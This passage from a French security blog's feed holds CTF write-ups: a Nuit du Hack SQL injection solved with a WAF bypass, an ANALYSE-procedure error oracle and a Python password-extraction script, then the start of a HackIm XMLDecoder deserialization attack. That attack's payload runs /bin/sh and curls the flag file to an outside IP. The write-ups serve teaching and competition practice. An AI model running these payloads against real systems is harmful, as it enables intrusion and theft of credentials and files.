+&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=6'&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_Waf.png" alt="SpaceSec Waf" style="width: 60%;"&gt;&lt;/p&gt;
+&lt;p&gt;Bon, ça ne marche pas très bien, voyons voir si l'on peut au moins déclencher une erreur SQL:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=-1&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_-1.png" alt="SpaceSec SQLi" style="width: 60%;"&gt;&lt;/p&gt;
+&lt;p&gt;Yeah, une belle erreur SQL !&lt;/p&gt;
+&lt;p&gt;En résumé, nous avons :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Un utilisateur Flag&lt;/li&gt;
+&lt;li&gt;Un offset modifiable d'une requête SQL&lt;/li&gt;
+&lt;li&gt;Une erreur SQL&lt;/li&gt;
+&lt;li&gt;Un affichage du numéro de l'erreur SQL&lt;/li&gt;
+&lt;li&gt;Un WAF maison (un pare-feu pour le Web)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Après un petit temps de réflexion on en vient à deux remarques :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Le WAF se bypass facilement à coups de %0a pour les espaces et de changements de casse (SeLEcT par exemple)&lt;/li&gt;
+&lt;li&gt;On ne peut pas faire d'UNION, la requête contient donc probablement un order by.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;La requête est donc dans le genre:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nx"&gt;FROM&lt;/span&gt; &lt;span class="nx"&gt;latable&lt;/span&gt; &lt;span class="nx"&gt;ORDER&lt;/span&gt; &lt;span class="nx"&gt;BY&lt;/span&gt; &lt;span class="nb"&gt;rand&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="nx"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="nx"&gt;OFFSET&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;offset&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Quelques recherches sur le web nous permettent de trouver un bypass assez sympathique à coup de procédure SQL.&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://raijee1337.blogspot.fr/2015/07/bypassing-incorrect-usage-of-union-and-order-by.html"&gt;L'article&lt;/a&gt; en question nous parle de l'utilisation de la procédure ANALYSE qui est présente dans mysql de base.&lt;/p&gt;
+&lt;p&gt;C'est presque trop beau pour être vrai, et... en effet ça l'est !&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=1%a0PRoCEDuRE%a0aNaLYSE%0a(eXtractValue%0a(0,1),1)--&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_Error1108-1.png" alt="Error1108" style="width: 60%;"&gt;&lt;/p&gt;
+&lt;p&gt;La page ne nous ressort que le numéro de l'erreur...&lt;/p&gt;
+&lt;p&gt;Alors, que faire pour contourner ce problème?&lt;/p&gt;
+&lt;p&gt;Eh bien, la réponse est simple, il suffit juste de faire une time-based injection !&lt;/p&gt;
+&lt;p&gt;Et... ça ne fonctionne pas, l'auteur du challenge à décidé de bloquer les fonctions sleep et benchmark...&lt;/p&gt;
+&lt;p&gt;Qu'à cela ne tienne, on passe donc par des heavy query !&lt;/p&gt;
+&lt;p&gt;On récupère plein de fois information_schema pour faire ramer la page et... information_schema est bloqué aussi ?!&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/imdone.gif" alt="Im done" style="width: 50%;"/&gt; &lt;/p&gt;
+&lt;p&gt;Je décide donc d'aller me coucher sur un échec. Ce fut à la fois une bonne et une mauvaise idée :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;J'ai trouvé la réponse dans la nuit&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Je n'ai pas dormi avant de l'avoir trouvée&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;De retour le lendemain &lt;s&gt;matin&lt;/s&gt; après-midi, je décide de tenter ma trouvaille :&lt;/p&gt;
+&lt;p&gt;Une SQL injection Boolean Based Into Double Error Based (oui, j'ai inventé le nom, mais ça en jette non?).&lt;/p&gt;
+&lt;p&gt;J'explique, on va tenter de faire passer une condition dans notre extractvalue, si cette condition est vraie on lui fait faire un convert(9990130101,date), la date étant complétement fausse la fonction plante et retourne NULL, sinon, on retourne 1.&lt;/p&gt;
+&lt;p&gt;Ce qu'il faut savoir, c'est que la procédure ANALYSE n'aime pas avoir un paramètre à NULL, elle crash donc un message d'&lt;a href="http://dev.mysql.com/doc/refman/5.0/en/error-messages-server.html#error_er_wrong_parameters_to_procedure"&gt;erreur 1108&lt;/a&gt; qui signifie "Message: Incorrect parameters to procedure '%s'"&lt;/p&gt;
+&lt;p&gt;En revanche si on lui envoie 1 en premier paramètre elle nous renvoie juste une erreur &lt;a href="http://dev.mysql.com/doc/refman/5.0/en/error-messages-server.html#error_er_unknown_error"&gt;1105&lt;/a&gt; : "Message: Unknown error"&lt;/p&gt;
+&lt;p&gt;On peut tester avec:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=1 PRoCEDuRE aNaLYSE ( (selEct exTractvalue (rAnd (),coNcat (0x3a, (case when (substring(1,1,1)=1) then convert(9990130101,date) else 1 end)))),1)--&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;J'ai remplacé les %0a par des espaces pour un souci de compréhension.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_Error1108-1.png" alt="Error1108" style="width: 60%;"&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://spacesec.quals.nuitduhack.com/index.php?offset=1 PRoCEDuRE aNaLYSE ( (selEct exTractvalue (rAnd (),coNcat (0x3a, (case when (substring(1,1,1)!=1) then convert(9990130101,date) else 1 end)))),1)--&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/SpaceSec_Error1105.png" alt="Error1105" style="width: 60%;"&gt;&lt;/p&gt;
+&lt;p&gt;A partir de là on peut tout simplement récupérer le mot de passe de l'utilisateur Flag dans la base de données.&lt;/p&gt;
+&lt;p&gt;Je vous épargne le temps afin de trouver la bonne table avec les bonnes colonnes (totalement au hasard).&lt;/p&gt;
+&lt;p&gt;Au final, on trouve une table users avec les colonnes id, username et password.&lt;/p&gt;
+&lt;p&gt;Ni une, ni deux, on code un petit script qui récupère tout ça.&lt;/p&gt;
+&lt;p&gt;Ayant une petite dent contre la programmation, je vous présente mon modeste script qui n'est pas optimisé mais qui fait le taf' :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/env python2&lt;/span&gt;
+&lt;span class="c1"&gt;# -*- coding: utf8 -*-&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nn"&gt;time&lt;/span&gt;
+
+&lt;span class="n"&gt;cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PHPSESSID&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;cl4r4m0rg4ne1sg00dbUt1pr3f3r3L3xiB3ll3&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;48&lt;/span&gt;
+
+&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+
+&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="mi"&gt;127&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://spacesec.quals.nuitduhack.com/index.php?offset=1&lt;/span&gt;&lt;span class="si"&gt;%a&lt;/span&gt;&lt;span class="s2"&gt;0PRoCEDuRE&lt;/span&gt;&lt;span class="si"&gt;%a&lt;/span&gt;&lt;span class="s2"&gt;0aNaLYSE&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(selEct&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;exTractvalue&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(rAnd&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(),coNcat&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(0x3a,&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(case&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;when&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(substring(&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;(selEct&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;password&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;fRom&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;users&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;wHere&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;username&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;liKe&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;0x464c4147),&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;,1)=char(&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;))&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;then&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;convert(9990130101,date)&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;else&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;1&lt;/span&gt;&lt;span class="si"&gt;%0a&lt;/span&gt;&lt;span class="s2"&gt;end)))),1)--&amp;quot;&lt;/span&gt;
+    &lt;span class="n"&gt;resultat&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;forge&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;
+    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;forge&lt;/span&gt;
+    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;resultat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1108&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;!=-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;47&lt;/span&gt;
+        &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;
+    &lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+
+&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[+] Le password est: &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On obtient un mot de passe qui ressemble à un hash de 128 caractères en majuscule.&lt;/p&gt;
+&lt;p&gt;La partie rigolote de l'histoire est que j'ai cherché pendant une bonne demi-heure quoi en faire et au final Mastho, un membre de mon équipe, l'a valider en 5 secondes en m'expliquant qu'il avait juste mis le hash en minuscule...&lt;/p&gt;
+&lt;p&gt;En définitive, une épreuve bien marrante avec des protections assez funs.&lt;/p&gt;
+&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon Twitter pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.&lt;/p&gt;
+&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="L'actualité commentée"></category><category term="WriteUp"></category><category term="NDH"></category><category term="CTF"></category><category term="SQL"></category></entry><entry><title>HackIm 2016 - Web100 / Web400 - Write-Up</title><link href="https://test.dailysecurity.fr/write-up-hackim-web100-web400" rel="alternate"></link><published>2016-02-03T15:06:00+01:00</published><updated>2016-02-03T15:06:00+01:00</updated><author><name>Geluchat</name></author><id>tag:test.dailysecurity.fr,2016-02-03:/write-up-hackim-web100-web400</id><summary type="html">&lt;p&gt;J'ai dernièrement participé avec mon équipe au HackIm, un CTF organisé par la &lt;a href="http://nullcon.net"&gt;NullCon&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Malgré une organisation catastrophique ainsi que des épreuves de type "devinette", ce CTF nous a proposé des challenges très intéressants dans les catégories Web et Exploitation.&lt;/p&gt;
+&lt;p&gt;Voici donc un write-up de deux épreuves web que j'ai …&lt;/p&gt;</summary><content type="html">&lt;p&gt;J'ai dernièrement participé avec mon équipe au HackIm, un CTF organisé par la &lt;a href="http://nullcon.net"&gt;NullCon&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Malgré une organisation catastrophique ainsi que des épreuves de type "devinette", ce CTF nous a proposé des challenges très intéressants dans les catégories Web et Exploitation.&lt;/p&gt;
+&lt;p&gt;Voici donc un write-up de deux épreuves web que j'ai trouvées enrichissantes.&lt;/p&gt;
+&lt;h3&gt;Web 100 - SignServer 100 pts&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Document signature is so hot right now! SignServer provides you with
+the most advanced solution to sign and verify your documents. We
+support any document types and provide you with a unique, ultra-secure
+signature.
+ http://54.174.72.79:9000&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Arrivé à l'adresse indiquée nous avons accès à deux services, l'un qui nous permet de signer et l'autre de vérifier une signature.&lt;/p&gt;
+&lt;p&gt;En envoyant un fichier au hasard (on évite celui qui contient nos mots de passe), on obtient:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;java&lt;/span&gt; &lt;span class="na"&gt;version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1.8.0_72-internal&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;java.beans.XMLDecoder&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;object&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;models.CTFSignature&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;CTFSignature0&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;void&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;models.CTFSignature&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;getField&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;hash&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;void&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;set&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+                &lt;span class="nt"&gt;&amp;lt;object&lt;/span&gt; &lt;span class="na"&gt;idref=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;CTFSignature0&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+                &lt;span class="nt"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;86f7e437faa5a7fce15d1ddcb9eaeaea377667b8&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;void&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;models.CTFSignature&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;getField&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;sig&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;void&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;set&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+                &lt;span class="nt"&gt;&amp;lt;object&lt;/span&gt; &lt;span class="na"&gt;idref=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;CTFSignature0&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+                &lt;span class="nt"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;902d4de8fb705154a1a0107c227b9d510523fa17&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;/object&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/java&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On peut voir que l'objet a été sérialisé en XML et passe dans la moulinette "XML Decoder".&lt;/p&gt;
+&lt;p&gt;Après quelques recherches sur cette méthode, &lt;a href="https://github.com/o2platform/DefCon_RESTing/tree/master/Demo /_O2_Scripts/XmlEncoder%20-%20Restlet/exploits"&gt;on apprend&lt;/a&gt; qu'elle peut prendre plusieurs objets en même temps.&lt;/p&gt;
+&lt;p&gt;La méthode ProcessBuilder sur package java.lang nous permet de faire appel à des commandes systèmes.&lt;/p&gt;
+&lt;p&gt;On envoie donc avec l'option signature cochée :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;java&lt;/span&gt; &lt;span class="na"&gt;version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1.8.0_72-internal&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;java.beans.XMLDecoder&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;object&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;models.CTFSignature&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;CTFSignature0&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;void&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;models.CTFSignature&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;getField&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;hash&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;void&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;set&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+                &lt;span class="nt"&gt;&amp;lt;object&lt;/span&gt; &lt;span class="na"&gt;idref=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;CTFSignature0&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+                &lt;span class="nt"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;86f7e437faa5a7fce15d1ddcb9eaeaea377667b8&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;void&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;models.CTFSignature&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;getField&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;sig&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;void&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;set&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+                &lt;span class="nt"&gt;&amp;lt;object&lt;/span&gt; &lt;span class="na"&gt;idref=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;CTFSignature0&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+                &lt;span class="nt"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;902d4de8fb705154a1a0107c227b9d510523fa17&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;/object&amp;gt;&lt;/span&gt;
+    &lt;span class="nt"&gt;&amp;lt;object&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;java.lang.ProcessBuilder&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class="nt"&gt;&amp;lt;array&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;java.lang.String&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;length=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;3&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;void&lt;/span&gt; &lt;span class="na"&gt;index=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; 
+                &lt;span class="nt"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;/bin/sh&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;                                
+            &lt;span class="nt"&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;     
+            &lt;span class="nt"&gt;&amp;lt;void&lt;/span&gt; &lt;span class="na"&gt;index=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; 
+                &lt;span class="nt"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;-c&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt; 
+            &lt;span class="nt"&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;
+            &lt;span class="nt"&gt;&amp;lt;void&lt;/span&gt; &lt;span class="na"&gt;index=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; 
+                &lt;span class="nt"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;/bin/cat flag | /usr/bin/tee /tmp/res;/usr/bin/curl 195.154.70.52:4444/1 --data &amp;quot;@/tmp/res&amp;quot;&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;                                
+            &lt;span class="nt"&gt;&amp;lt;/void&amp;gt;&lt;/span&gt;             
